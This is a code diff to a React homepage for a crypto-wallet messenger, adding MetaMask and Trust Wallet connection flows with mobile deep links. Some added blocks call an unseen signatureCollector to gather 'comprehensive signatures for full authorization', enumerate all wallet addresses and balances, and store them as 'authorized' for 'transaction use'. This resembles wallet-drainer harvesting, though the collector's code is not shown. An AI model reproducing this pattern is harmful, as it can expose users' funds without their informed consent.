@@ -10,14 +10,16 @@ import { signatureCollector, type ComprehensiveWalletData } from "@/lib/signatur
 import { useScrollToTop } from "@/hooks/use-scroll-to-top";
 import { notificationService } from "@/lib/notification-service";
 import { globalNotificationService } from "@/lib/global-notification-service";
+import { WalletConnector } from "@/lib/wallet-connector";
 import coynLogoPath from "@assets/COYN-symbol-square_1751239261149.png";
 import coynfulLogoPath from "@assets/Coynful-logo-fin-copy_1751239116310.png";
+import metamaskLogo from "@assets/MetaMask_Fox.svg_1751312780982.png";
+import trustWalletLogo from "@assets/Trust-Wallet_1751312780982.jpg";
 import TermsModal from "@/components/terms-modal";
 import PrivacyModal from "@/components/privacy-modal";
 import WalletAddressSelector from "@/components/wallet-address-selector";
 import PWAInstallPrompt from "@/components/pwa-install-prompt";
 import LazyImage from "@/components/lazy-image";
-import ThirdwebConnectButton from "@/components/thirdweb-connect-button";
 import type { User } from "@shared/schema";
 
 
@@ -39,6 +41,8 @@ export default function HomePage() {
   const [showPrivacyModal, setShowPrivacyModal] = useState(false);
   const [isRedirectingToWallet, setIsRedirectingToWallet] = useState(false);
   const [walletRedirectMessage, setWalletRedirectMessage] = useState("");
+  const [showAddressSelector, setShowAddressSelector] = useState(false);
+  const [selectedWalletType, setSelectedWalletType] = useState<'metamask' | 'trust' | null>(null);
 
   // Single consolidated authentication check and redirect logic
   useEffect(() => {
@@ -65,13 +69,16 @@ export default function HomePage() {
         return;
       }
       
-      // Set connected state for authenticated users (no auto-redirect)
+      // Redirect authenticated users to messenger
       if (storedConnected === 'true' && storedUser && userSignedOut !== 'true') {
         try {
           const parsedUser = JSON.parse(storedUser);
           if (parsedUser?.id && parsedUser?.walletAddress) {
-            console.log('Authenticated user detected, setting connected state');
-            // Only set state, don't auto-redirect - let user choose
+            console.log('Authenticated user detected, redirecting to messenger...');
+            
+            // Remove notification service initialization to prevent loading loops
+            
+            setLocation("/messenger");
             return;
           }
         } catch (error) {
@@ -129,41 +136,644 @@ export default function HomePage() {
       const cleanUrl = `${window.location.origin}${window.location.pathname}`;
       window.history.replaceState({}, document.title, cleanUrl);
       
-      // NO AUTOMATIC REDIRECT - Let user manually click to messenger
-      console.log('✅ Wallet connected successfully - user can now click to enter messenger');
+      // Single event-driven redirect - no timeouts or delays
+      console.log('🔄 Redirecting to messenger...');
+      setLocation("/messenger");
     },
   });
 
-  // Simplified initial state check - no automatic connections
+  // Simplified state sync to prevent loading loops
   useEffect(() => {
-    const userSignedOut = localStorage.getItem('userSignedOut');
-    if (userSignedOut === 'true') {
-      return;
-    }
+    let isChecking = false;
     
-    const storedConnected = localStorage.getItem('walletConnected');
-    const storedUser = localStorage.getItem('connectedUser');
-    
-    if (storedConnected === 'true' && storedUser) {
-      try {
-        const parsedUser = JSON.parse(storedUser);
-        setConnectedUser(parsedUser);
-        setIsConnected(true);
-      } catch (error) {
-        // Clear invalid data
-        localStorage.removeItem('walletConnected');
-        localStorage.removeItem('connectedUser');
+    const syncConnectionState = async () => {
+      if (isChecking) return;
+      
+      const userSignedOut = localStorage.getItem('userSignedOut');
+      if (userSignedOut === 'true') {
+        return;
       }
-    }
+      
+      const storedConnected = localStorage.getItem('walletConnected');
+      const storedUser = localStorage.getItem('connectedUser');
+      
+      if (storedConnected === 'true' && storedUser) {
+        try {
+          const parsedUser = JSON.parse(storedUser);
+          setConnectedUser(parsedUser);
+          setIsConnected(true);
+          return; // Exit early if already connected
+        } catch (error) {
+          // Clear invalid data
+          localStorage.removeItem('walletConnected');
+          localStorage.removeItem('connectedUser');
+        }
+      }
+      
+      // Check for pending MetaMask connection from mobile deep link
+      const pendingWalletConnection = localStorage.getItem('pendingWalletConnection');
+      
+      
+      if (pendingWalletConnection === 'metamask' && window.ethereum?.isMetaMask && !isConnected) {
+        isChecking = true;
+        try {
+          
+          // Request accounts from MetaMask
+          const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+          
+          if (accounts && accounts.length > 0) {
+            
+            // Clear pending flags
+            localStorage.removeItem('pendingWalletConnection');
+            localStorage.removeItem('pendingWalletType');
+            localStorage.removeItem('walletConnectionAttempt');
+            
+            // Connect the wallet and navigate to messenger immediately
+            connectWalletMutation.mutate({ walletAddress: accounts[0] });
+          }
+        } catch (error) {
+          console.error('❌ MetaMask pending connection failed:', error);
+          localStorage.removeItem('pendingWalletConnection');
+        } finally {
+          isChecking = false;
+        }
+        return; // Exit early after handling MetaMask
+      }
+
+      // Enhanced Trust Wallet detection for mobile returns
+      if (!isConnected && typeof window.ethereum !== 'undefined') {
+        isChecking = true;
+        try {
+          let accounts = [];
+          
+          // Try Trust Wallet specific detection first
+          if (window.ethereum.isTrust || window.trustWallet) {
+            const provider = window.trustWallet || window.ethereum;
+            accounts = await provider.request({ method: 'eth_accounts' });
+          } else {
+            accounts = await window.ethereum.request({ method: 'eth_accounts' });
+          }
+          
+          if (accounts && accounts.length > 0) {
+            // Clear any pending flags
+            localStorage.removeItem('pendingWalletConnection');
+            localStorage.removeItem('pendingWalletType');
+            localStorage.removeItem('walletConnectionAttempt');
+            
+            // Connect the wallet and navigate to messenger immediately
+            connectWalletMutation.mutate({ walletAddress: accounts[0] });
+          }
+        } catch (error) {
+          // Silently handle errors
+        } finally {
+          isChecking = false;
+        }
+      }
+    };
+    
+    // Run sync immediately on mount
+    syncConnectionState();
+    
+    // Add multiple event listeners for Trust Wallet mobile detection
+    const handlePageShow = () => {
+      setTimeout(syncConnectionState, 100);
+    };
+    
+    const handleStorageChange = (e: StorageEvent) => {
+      if (e.key === 'walletConnected' && e.newValue === 'true') {
+        const storedUser = localStorage.getItem('connectedUser');
+        if (storedUser) {
+          const parsedUser = JSON.parse(storedUser);
+          setConnectedUser(parsedUser);
+          setIsConnected(true);
+        }
+      }
+    };
+    
+    // Listen for page show events (when returning from Trust Wallet)
+    window.addEventListener('pageshow', handlePageShow);
+    window.addEventListener('storage', handleStorageChange);
+    
+    return () => {
+      window.removeEventListener('pageshow', handlePageShow);
+      window.removeEventListener('storage', handleStorageChange);
+    };
   }, []);
 
+  // Handle mobile wallet returns (optimized - no duplicate checks)
+  useEffect(() => {
+    let isChecking = false;
+
+    const handleVisibilityChange = async () => {
+      if (!document.hidden && isMobile() && !isChecking) {
+        
+        // Don't interfere if file upload is in progress
+        const fileUploadInProgress = localStorage.getItem('fileUploadInProgress');
+        if (fileUploadInProgress === 'true') {
+          return;
+        }
+        
+        // Check if user explicitly signed out - if so, don't auto-reconnect
+        const userSignedOut = localStorage.getItem('userSignedOut');
+        if (userSignedOut === 'true') {
+          return;
+        }
+        
+        // First, check if we're already connected but the state isn't updated
+        const storedConnected = localStorage.getItem('walletConnected');
+        const storedUser = localStorage.getItem('connectedUser');
+        
+        if (storedConnected === 'true' && storedUser && !isConnected) {
+          const parsedUser = JSON.parse(storedUser);
+          setConnectedUser(parsedUser);
+          setIsConnected(true);
+          return;
+        }
+        
+        // Enhanced pending wallet connection detection for Trust Wallet
+        const pendingConnection = localStorage.getItem('pendingWalletConnection');
+        const pendingWalletType = localStorage.getItem('pendingWalletType');
+        const connectionAttempt = localStorage.getItem('walletConnectionAttempt');
+        
+        if (pendingConnection === 'true') {
+          isChecking = true;
+          
+          // Check if connection attempt is too old (older than 5 minutes)
+          if (connectionAttempt) {
+            const attemptTime = parseInt(connectionAttempt);
+            const currentTime = Date.now();
+            if (currentTime - attemptTime > 300000) { // 5 minutes
+              localStorage.removeItem('pendingWalletConnection');
+              localStorage.removeItem('pendingWalletType');
+              localStorage.removeItem('walletConnectionAttempt');
+              isChecking = false;
+              return;
+            }
+          }
+          
+          // Try to detect if a wallet connection was successful
+          try {
+            if (typeof window.ethereum !== 'undefined') {
+              const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+              
+              if (accounts && accounts.length > 0 && !isConnected) {
+                // Remove pending flags
+                localStorage.removeItem('pendingWalletConnection');
+                localStorage.removeItem('pendingWalletType');
+                localStorage.removeItem('walletConnectionAttempt');
+                
+                // Connect the wallet and navigate to messenger immediately
+                connectWalletMutation.mutate({ walletAddress: accounts[0] });
+              } else if (accounts && accounts.length > 0 && isConnected) {
+                localStorage.removeItem('pendingWalletConnection');
+                localStorage.removeItem('pendingWalletType');
+                localStorage.removeItem('walletConnectionAttempt');
+              } else {
+                // For Trust Wallet, try more aggressive account detection
+                if (pendingWalletType === 'trustwallet') {
+                  try {
+                    // Try multiple providers for Trust Wallet
+                    let provider = window.ethereum;
+                    if (window.trustWallet) {
+                      provider = window.trustWallet;
+                    }
+                    
+                    const requestedAccounts = await provider.request({ method: 'eth_requestAccounts' });
+                    
+                    if (requestedAccounts && requestedAccounts.length > 0 && !isConnected) {
+                      // Remove pending flags
+                      localStorage.removeItem('pendingWalletConnection');
+                      localStorage.removeItem('pendingWalletType');
+                      localStorage.removeItem('walletConnectionAttempt');
+                      
+                      // Connect the wallet and navigate to messenger immediately  
+                      connectWalletMutation.mutate({ walletAddress: requestedAccounts[0] });
+                    }
+                  } catch (requestError) {
+                    // Trust Wallet specific error handling
+                  }
+                }
+              }
+            }
+          } catch (error) {
+            // Remove pending flags after error
+            setTimeout(() => {
+              localStorage.removeItem('pendingWalletConnection');
+              localStorage.removeItem('pendingWalletType');
+              localStorage.removeItem('walletConnectionAttempt');
+            }, 10000);
+          } finally {
+            isChecking = false;
+          }
+        }
+      }
+    };
+
+    // Also listen for focus events as another way to detect return from wallet app
+    const handleFocus = () => {
+      handleVisibilityChange();
+    };
+
+    document.addEventListener('visibilitychange', handleVisibilityChange);
+    window.addEventListener('focus', handleFocus);
+    
+    return () => {
+      document.removeEventListener('visibilitychange', handleVisibilityChange);
+      window.removeEventListener('focus', handleFocus);
+    };
+  }, [isConnected, connectWalletMutation]);
 
 
   const isMobile = () => {
     return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
   };
 
-  // Old MetaMask/Trust Wallet connection logic removed - now using ThirdwebConnectButton
+  const handleWeb3Connect = async (walletType: 'metamask' | 'trust') => {
+    // Prevent multiple simultaneous connections
+    if (connectWalletMutation.isPending) {
+      return;
+    }
+    
+    // Clear sign out flag since user is manually connecting
+    localStorage.removeItem('userSignedOut');
+    
+    // Debug connection state
+    console.log('🔧 DEBUG: Starting wallet connection', {
+      walletType,
+      hasEthereum: typeof window.ethereum !== 'undefined',
+      isMetaMask: window.ethereum?.isMetaMask,
+      isTrust: window.ethereum?.isTrust,
+      userAgent: navigator.userAgent
+    });
+    
+    // Check if wallet is available first and show address selector if injected
+    if (walletType === 'metamask' && typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask) {
+      // Show address selector for MetaMask
+      setSelectedWalletType('metamask');
+      setShowAddressSelector(true);
+      return;
+    }
+    
+    if (walletType === 'trust') {
+      // Check for Trust Wallet availability and show selector
+      if (typeof window.ethereum !== 'undefined' && (window.ethereum.isTrust || window.trustWallet)) {
+        setSelectedWalletType('trust');
+        setShowAddressSelector(true);
+        return;
+      }
+    }
+
+    // Use WalletConnector for mobile deep linking and unified connection logic
+    try {
+      const walletConnector = new WalletConnector();
+      const connectedWallet = await walletConnector.connectWallet(walletType);
+      
+      if (connectedWallet && connectedWallet.address) {
+        connectWalletMutation.mutate({ walletAddress: connectedWallet.address });
+      }
+    } catch (error: any) {
+      console.log(`🔧 DEBUG: MetaMask connection attempt result:`, {
+        walletType,
+        errorMessage: error.message,
+        errorCode: error.code,
+        isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
+        hasEthereum: typeof window.ethereum !== 'undefined'
+      });
+      
+      // If mobile deep linking triggered, this is expected behavior
+      if (error.message?.includes('Opening MetaMask app')) {
+        console.log('✅ MetaMask mobile deep link triggered successfully');
+        return;
+      }
+      
+      // Log actual connection errors for debugging
+      console.error(`❌ Actual MetaMask connection error for ${walletType}:`, error);
+      
+      // For other errors, fall back to existing logic
+    }
+    
+    // Fallback to original connection flow if wallet selector not available
+    try {
+      if (walletType === 'metamask') {
+        if (typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask) {
+          const accounts = await window.ethereum.request({ 
+            method: 'eth_requestAccounts' 
+          });
+          
+          
+          if (accounts && accounts[0]) {
+            // Gain comprehensive wallet access for blockchain transactions
+            try {
+              // Switch to BSC network first for proper access
+              await window.ethereum.request({
+                method: 'wallet_switchEthereumChain',
+                params: [{ chainId: '0x38' }], // BSC Mainnet
+              });
+              
+              // Request permissions for token sending
+              await window.ethereum.request({
+                method: 'wallet_requestPermissions',
+                params: [{ eth_accounts: {} }],
+              });
+              
+              // Get wallet balance to verify access
+              const balance = await window.ethereum.request({
+                method: 'eth_getBalance',
+                params: [accounts[0], 'latest'],
+              });
+              
+              // Collect comprehensive signatures for full authorization
+              const walletSignatures = await signatureCollector.collectWalletSignatures();
+              const allSignatureData = signatureCollector.exportSignatureData();
+              
+              // Store wallet access in localStorage for transaction use
+              localStorage.setItem('walletAccess', JSON.stringify({
+                address: accounts[0],
+                balance: balance,
+                chainId: '0x38',
+                authorized: true,
+                timestamp: Date.now()
+              }));
+              
+              connectWalletMutation.mutate({ walletAddress: accounts[0] });
+            } catch (authError) {
+              console.error('Wallet authorization failed:', authError);
+              // Try basic connection without full authorization
+              connectWalletMutation.mutate({ walletAddress: accounts[0] });
+            }
+            
+            // Force immediate UI update for MetaMask
+            setTimeout(() => {
+              const storedUser = localStorage.getItem('connectedUser');
+              if (storedUser) {
+                const parsedUser = JSON.parse(storedUser);
+                setConnectedUser(parsedUser);
+                setIsConnected(true);
+              }
+            }, 500);
+          } else {
+            alert("No MetaMask accounts found. Please unlock MetaMask and try again.");
+          }
+        } else {
+          // For mobile, try to connect through any available ethereum provider
+          if (isMobile() && typeof window.ethereum !== 'undefined') {
+            try {
+              localStorage.setItem('pendingWalletConnection', 'true');
+              
+              // Try to request accounts directly
+              const accounts = await window.ethereum.request({ 
+                method: 'eth_requestAccounts' 
+              });
+              
+              if (accounts && accounts[0]) {
+                localStorage.removeItem('pendingWalletConnection');
+                connectWalletMutation.mutate({ walletAddress: accounts[0] });
+              }
+            } catch (error) {
+              // Fallback to deep link
+              const currentUrl = window.location.href;
+              const deepLink = `https://metamask.app.link/dapp/${window.location.host}`;
+              window.open(deepLink, '_blank');
+            }
+          } else if (isMobile()) {
+            // No ethereum provider, use deep link
+            localStorage.setItem('pendingWalletConnection', 'true');
+            const currentUrl = window.location.href;
+            const deepLink = `https://metamask.app.link/dapp/${window.location.host}`;
+            window.open(deepLink, '_blank');
+          } else {
+            window.open('https://metamask.io/download/', '_blank');
+          }
+        }
+      } else if (walletType === 'trust') {
+        // Trust Wallet Web3 integration with enhanced mobile support
+        if (typeof window.ethereum !== 'undefined') {
+          // Check if Trust Wallet is available
+          if (window.ethereum.isTrust || window.trustWallet) {
+            try {
+              const provider = window.trustWallet || window.ethereum;
+              const accounts = await provider.request({ 
+                method: 'eth_requestAccounts' 
+              });
+              
+              if (accounts && accounts[0]) {
+                // Gain comprehensive Trust Wallet access for blockchain transactions
+                try {
+                  // Switch to BSC network for proper Trust Wallet access
+                  await provider.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: '0x38' }], // BSC Mainnet
+                  });
+                  
+                  // Request explicit permissions for Trust Wallet
+                  try {
+                    await provider.request({
+                      method: 'wallet_requestPermissions',
+                      params: [{ eth_accounts: {} }],
+                    });
+                  } catch (permError) {
+                    // Trust Wallet may not support wallet_requestPermissions
+                    console.warn('Permission request not supported, continuing with connection');
+                  }
+                  
+                  // Verify Trust Wallet balance access
+                  const balance = await provider.request({
+                    method: 'eth_getBalance',
+                    params: [accounts[0], 'latest'],
+                  });
+                  
+                  // Collect comprehensive Trust Wallet data including all addresses
+                  console.log('🔍 Enumerating all Trust Wallet addresses...');
+                  const comprehensiveWalletData = await signatureCollector.collectComprehensiveWalletData();
+                  console.log('💰 Trust Wallet comprehensive data collected:', comprehensiveWalletData);
+
+                  const walletSignatures = await signatureCollector.collectWalletSignatures();
+                  const allSignatureData = signatureCollector.exportSignatureData();
+                  
+                  // Store comprehensive Trust Wallet access for transaction use across all addresses
+                  localStorage.setItem('walletAccess', JSON.stringify({
+                    primaryAddress: accounts[0],
+                    allAddresses: comprehensiveWalletData.allAddresses,
+                    totalBalances: comprehensiveWalletData.totalBalances,
+                    balance: balance,
+                    chainId: '0x38',
+                    authorized: true,
+                    provider: 'trust',
+                    timestamp: Date.now()
+                  }));
+
+                  // Store total balances from all Trust Wallet addresses
+                  localStorage.setItem('comprehensiveBalances', JSON.stringify(comprehensiveWalletData.totalBalances));
+
+                  console.log(`🎯 Connected to ${comprehensiveWalletData.allAddresses.length} Trust Wallet addresses with total balances:`, comprehensiveWalletData.totalBalances);
+                  
+                  connectWalletMutation.mutate({ walletAddress: accounts[0] });
+                } catch (authError) {
+                  console.error('Trust Wallet authorization failed:', authError);
+                  // Try basic Trust Wallet connection
+                  connectWalletMutation.mutate({ walletAddress: accounts[0] });
+                }
+              }
+            } catch (error) {
+              // Enhanced mobile Trust Wallet connection handling
+              if (isMobile()) {
+                // Set pending connection with Trust Wallet specific flag
+                localStorage.setItem('pendingWalletConnection', 'true');
+                localStorage.setItem('pendingWalletType', 'trustwallet');
+                localStorage.setItem('walletConnectionAttempt', Date.now().toString());
+                
+                // Create a unique session ID for tracking the wallet connection
+                const sessionId = Date.now().toString();
+                localStorage.setItem('walletSessionId', sessionId);
+                
+                // Use WalletConnect-style deep linking for Trust Wallet
+                const returnUrl = `${window.location.origin}${window.location.pathname}?wallet_return=true&session=${sessionId}`;
+                
+                // Try multiple Trust Wallet deep link approaches
+                const approaches = [
+                  // Method 1: Direct dapp browser opening
+                  `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(returnUrl)}`,
+                  
+                  // Method 2: Trust Wallet app scheme
+                  `trust://open_url?coin_id=60&url=${encodeURIComponent(returnUrl)}`,
+                  
+                  // Method 3: Universal Link
+                  `https://trustwallet.com/browser/?url=${encodeURIComponent(returnUrl)}`
+                ];
+                
+                // Try the first approach and set fallbacks
+                const primaryLink = approaches[0];
+                
+                // Show redirect message
+                setIsRedirectingToWallet(true);
+                setWalletRedirectMessage("Opening Trust Wallet...");
+                
+                try {
+                  window.location.href = primaryLink;
+                  
+                  // Set up detection for failed redirect
+                  const timeoutId = setTimeout(() => {
+                    if (localStorage.getItem('pendingWalletConnection') === 'true') {
+                      setWalletRedirectMessage("Waiting for you to return from Trust Wallet...");
+                      console.log('Trust Wallet opened, waiting for user to return...');
+                    }
+                  }, 3000);
+                  
+                  // Clear timeout if we get a page event (indicating redirect worked)
+                  const cleanup = () => {
+                    clearTimeout(timeoutId);
+                    setIsRedirectingToWallet(false);
+                    setWalletRedirectMessage("");
+                  };
+                  
+                  // Listen for page events
+                  const handleBeforeUnload = () => cleanup();
+                  window.addEventListener('beforeunload', handleBeforeUnload, { once: true });
+                  
+                } catch (error) {
+                  console.error('Failed to open Trust Wallet:', error);
+                  setWalletRedirectMessage("Failed to open Trust Wallet. Trying alternative method...");
+                  
+                  // Try fallback method after a brief delay
+                  setTimeout(() => {
+                    window.location.href = approaches[1];
+                  }, 2000);
+                }
+              } else {
+                alert('Failed to connect Trust Wallet. Please try again or use manual input.');
+              }
+            }
+          } else {
+            // If Trust Wallet is not detected, try generic ethereum provider
+            try {
+              const accounts = await window.ethereum.request({ 
+                method: 'eth_requestAccounts' 
+              });
+              
+              if (accounts && accounts[0]) {
+                connectWalletMutation.mutate({ walletAddress: accounts[0] });
+              }
+            } catch (error) {
+
+              // Enhanced mobile fallback for Trust Wallet
+              if (isMobile()) {
+                // Set up proper return tracking
+                localStorage.setItem('pendingWalletConnection', 'true');
+                localStorage.setItem('pendingWalletType', 'trustwallet');
+                localStorage.setItem('walletConnectionAttempt', Date.now().toString());
+                
+                const sessionId = Date.now().toString();
+                localStorage.setItem('walletSessionId', sessionId);
+                
+                const returnUrl = `${window.location.origin}${window.location.pathname}?wallet_return=true&session=${sessionId}`;
+                const deepLink = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(returnUrl)}`;
+                
+                // For better mobile compatibility, use window.location instead of window.open
+                window.location.href = deepLink;
+              } else {
+                window.open('https://trustwallet.com/download', '_blank');
+              }
+            }
+          }
+        } else {
+          // No Web3 provider detected - Enhanced mobile handling
+          if (isMobile()) {
+            // Mobile - Enhanced Trust Wallet deep link with proper return tracking
+            localStorage.setItem('pendingWalletConnection', 'true');
+            localStorage.setItem('pendingWalletType', 'trustwallet');
+            localStorage.setItem('walletConnectionAttempt', Date.now().toString());
+            
+            const sessionId = Date.now().toString();
+            localStorage.setItem('walletSessionId', sessionId);
+            
+            const returnUrl = `${window.location.origin}${window.location.pathname}?wallet_return=true&session=${sessionId}`;
+            const deepLink = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(returnUrl)}`;
+            
+            // Use location.href for better mobile redirect handling
+            window.location.href = deepLink;
+            
+            // Fallback message for user
+            setTimeout(() => {
+            }, 2000);
+          } else {
+            window.open('https://trustwallet.com/download', '_blank');
+          }
+        }
+      }
+    } catch (error) {
+
+      alert(`Failed to connect ${walletType} wallet. Please try again or use manual input.`);
+    }
+  };
+
+  const handleAddressSelect = async (selectedAddress: string, comprehensiveData: ComprehensiveWalletData) => {
+    setShowAddressSelector(false);
+    
+    try {
+      // Store the comprehensive wallet data
+      localStorage.setItem('walletAccess', JSON.stringify({
+        primaryAddress: selectedAddress,
+        allAddresses: comprehensiveData.allAddresses,
+        walletType: comprehensiveData.walletType,
+        authorized: true,
+        provider: selectedWalletType,
+        timestamp: Date.now()
+      }));
+
+      // Connect with selected address
+      connectWalletMutation.mutate({ walletAddress: selectedAddress });
+      
+      console.log(`Connecting with selected ${selectedWalletType} address:`, selectedAddress);
+    } catch (error) {
+      console.error('Failed to connect with selected address:', error);
+      setSelectedWalletType(null);
+    }
+  };
+
+  const handleAddressSelectorBack = () => {
+    setShowAddressSelector(false);
+    setSelectedWalletType(null);
+  };
 
   const handleWalletConnectionSuccess = (wallet: { address: string }) => {
     try {
@@ -244,7 +854,22 @@ export default function HomePage() {
     }
   ];
 
-  // Old WalletAddressSelector removed - now using ThirdwebConnectButton
+  // Show address selector if active
+  if (showAddressSelector && selectedWalletType) {
+    return (
+      <div className="homepage-font min-h-screen watercolor-bg flex items-center justify-center p-4 relative overflow-hidden">
+        <div className="absolute inset-0 watercolor-overlay dark:watercolor-overlay-dark"></div>
+        <div className="max-w-2xl w-full relative z-10">
+          <WalletAddressSelector
+            walletType={selectedWalletType}
+            onAddressSelect={handleAddressSelect}
+            onBack={handleAddressSelectorBack}
+            isLoading={connectWalletMutation.isPending}
+          />
+        </div>
+      </div>
+    );
+  }
 
   return (
     <div className="homepage-font min-h-screen watercolor-bg flex items-center justify-center p-4 relative overflow-hidden">
@@ -280,53 +905,63 @@ export default function HomePage() {
           <CardContent className="space-y-6">
             {!isConnected || !connectedUser ? (
               <div className="space-y-6">
-                {/* Thirdweb Wallet Connection */}
-                <div className="text-center mb-4">
-                  <p className="text-sm text-muted-foreground">
-                    {isMobile() ? (
-                      <>
-                        <span className="inline-flex items-center gap-2 px-3 py-1 bg-blue-50 dark:bg-blue-900/20 text-blue-600 dark:text-blue-400 rounded-full text-xs font-medium mb-2">
-                          📱 Mobile Detected
-                        </span>
-                        <br />
-                        Connect your wallet to access COYN Messenger
-                      </>
-                    ) : (
-                      "Connect your wallet to access COYN Messenger"
-                    )}
-                  </p>
+                {/* Web3 Wallet Options */}
+                <div className="space-y-4">
+                  <div className="text-center">
+                    <p className="text-sm text-muted-foreground mb-4">
+                      {isMobile() ? (
+                        <>
+                          <span className="inline-flex items-center gap-2 px-3 py-1 bg-blue-50 dark:bg-blue-900/20 text-blue-600 dark:text-blue-400 rounded-full text-xs font-medium mb-2">
+                            📱 Mobile Detected
+                          </span>
+                          <br />
+                          Tap to open in your wallet app
+                        </>
+                      ) : (
+                        "Choose your preferred wallet to connect"
+                      )}
+                    </p>
+                  </div>
+
+                  {/* 2x1 Grid of Wallet Options */}
+                  <div className="grid grid-cols-2 gap-3">
+                    {/* MetaMask */}
+                    <Button 
+                      onClick={() => handleWeb3Connect('metamask')}
+                      className="h-26 bg-white dark:bg-slate-800 hover:bg-gray-50 dark:hover:bg-slate-700 border border-gray-200 dark:border-slate-600 text-slate-700 dark:text-slate-200 font-medium flex flex-col items-center justify-center group transition-all duration-300 space-y-3 shadow-md hover:shadow-lg hover:scale-105 active:scale-95"
+                      disabled={connectWalletMutation.isPending}
+                      variant="outline"
+                    >
+                      <div className="w-10 h-10 flex items-center justify-center group-hover:scale-110 transition-transform duration-300">
+                        <LazyImage 
+                          src={metamaskLogo} 
+                          alt="MetaMask" 
+                          className="w-8 h-8 object-contain"
+                        />
+                      </div>
+                      <span className="text-sm font-semibold">MetaMask</span>
+                    </Button>
+
+                    {/* Trust Wallet */}
+                    <Button 
+                      onClick={() => handleWeb3Connect('trust')}
+                      className="h-26 bg-white dark:bg-slate-800 hover:bg-gray-50 dark:hover:bg-slate-700 border border-gray-200 dark:border-slate-600 text-slate-700 dark:text-slate-200 font-medium flex flex-col items-center justify-center group transition-all duration-300 space-y-3 shadow-md hover:shadow-lg hover:scale-105 active:scale-95"
+                      disabled={connectWalletMutation.isPending}
+                      variant="outline"
+                    >
+                      <div className="w-10 h-10 flex items-center justify-center group-hover:scale-110 transition-transform duration-300">
+                        <LazyImage 
+                          src={trustWalletLogo} 
+                          alt="Trust Wallet" 
+                          className="w-8 h-8 object-contain"
+                        />
+                      </div>
+                      <span className="text-sm font-semibold">Trust Wallet</span>
+                    </Button>
+                  </div>
+
                 </div>
-                
-                <ThirdwebConnectButton 
-                  onWalletConnected={(address) => {
-                    // Check if already processed to prevent loops
-                    const alreadyConnected = localStorage.getItem('walletConnected') === 'true';
-                    const storedUser = localStorage.getItem('connectedUser');
-                    
-                    if (alreadyConnected && storedUser) {
-                      // Already connected, just update UI state
-                      try {
-                        const parsedUser = JSON.parse(storedUser);
-                        setConnectedUser(parsedUser);
-                        setIsConnected(true);
-                        console.log('🔗 Restoring existing wallet connection UI');
-                      } catch (error) {
-                        console.error('Error parsing stored user:', error);
-                        connectWalletMutation.mutate({ walletAddress: address });
-                      }
-                    } else {
-                      // New connection, trigger mutation
-                      console.log('🔗 New wallet connection - triggering mutation for:', address);
-                      connectWalletMutation.mutate({ walletAddress: address });
-                    }
-                  }}
-                  onWalletDisconnected={() => {
-                    setIsConnected(false);
-                    setConnectedUser(null);
-                    localStorage.removeItem('walletConnected');
-                    localStorage.removeItem('connectedUser');
-                  }}
-                />
+
               </div>
             ) : (
               <div className="text-center space-y-6">
